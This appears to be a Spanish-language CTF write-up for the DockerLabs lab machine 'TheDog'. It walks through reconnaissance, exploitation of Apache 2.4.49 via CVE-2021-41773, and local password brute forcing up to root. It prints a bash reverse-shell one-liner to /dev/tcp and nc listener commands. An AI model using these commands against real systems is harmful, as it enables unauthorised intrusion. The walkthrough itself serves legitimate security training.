@@ -1,0 +1,204 @@
+---
+title: TheDog
+description: Resolución completa de la máquina virtual *TheDog* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **TheDog**, desarrollada por *firstatack* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web que ejecuta **Apache HTTP Server 2.4.49**, vulnerable a **CVE-2021-41773**, permitiendo path traversal y ejecución remota de comandos. Con un exploit público, se obtiene acceso como `www-data`.
+Una vez dentro, se utiliza `UserRush` para fuerza bruta local y obtener la contraseña del usuario `punky`. Finalmente, se repite el ataque contra el usuario `root`, obteniendo acceso completo al sistema.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'TheDog',
+    Autor: 'firstatack',
+    Dificultad: 'Media',
+    Fecha: '13/05/2025',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip TheDog.zip
+sudo bash auto_deploy.sh TheDog.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p TheDog/{content,exploits,nmap,scripts}
+cd TheDog
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1769756435/Ports_z3bu49.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p80 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
+  -x php,html,txt,js -t 100 -C 404
+```
+
+![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1769756434/Feroxbuster_yxxmya.png)
+
+**Recursos relevantes:**
+- `/index.html` — Página informativa con comentario.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1769756435/Index_f2jmip.png)
+- `/html.html` — Revela el usuario `punky`.
+  ![Hint](https://res.cloudinary.com/dewqswzke/image/upload/v1769756434/Hint_mbbu3u.png)
+
+Se identifica la versión de Apache con `whatweb`:
+
+```bash
+whatweb http://172.17.0.2
+```
+
+![Whatweb](https://res.cloudinary.com/dewqswzke/image/upload/v1769756438/Whatweb_gavbzc.png)
+
+Apache 2.4.49 es vulnerable a **CVE-2021-41773**.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Explotación de CVE-2021-41773
+
+Se utiliza un exploit público:
+
+```bash
+python3 exploit.py -t 172.17.0.2
+```
+
+![ID Shell](https://res.cloudinary.com/dewqswzke/image/upload/v1769756435/IdShell_lxrjip.png)
+
+### 2.2 Reverse shell
+
+Se inicia un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se ejecuta el payload:
+
+```bash
+bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"
+```
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1769756437/Reverse_u8bnqh.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → punky
+
+Se utiliza `UserRush` para fuerza bruta local sobre `punky`:
+
+```bash
+./UserRush -u punky
+```
+
+![UserRush](https://res.cloudinary.com/dewqswzke/image/upload/v1769756438/UserRush_w49ktt.png)
+
+```bash
+su punky
+```
+
+![Punky](https://res.cloudinary.com/dewqswzke/image/upload/v1769756436/Punky_jvewdh.png)
+
+### 3.2 De punky → root
+
+Se repite `UserRush` sobre `root`:
+
+```bash
+./UserRush -u root
+```
+
+![Root UserRush](https://res.cloudinary.com/dewqswzke/image/upload/v1769756437/RootUserRush_jtfunr.png)
+
+```bash
+su root
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1769756437/Root_hntrsg.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Apache 2.4.49 vulnerable a CVE-2021-41773",
+      severity: "Crítica",
+      impact: "Path traversal y ejecución remota de comandos"
+    },
+    {
+      vulnerability: "Exposición de información en comentarios HTML",
+      severity: "Media",
+      impact: "Revelación de nombre de usuario"
+    },
+    {
+      vulnerability: "Credenciales débiles en usuarios del sistema",
+      severity: "Crítica",
+      impact: "Escalada de privilegios mediante fuerza bruta"
+    }
+  ]}
+/>
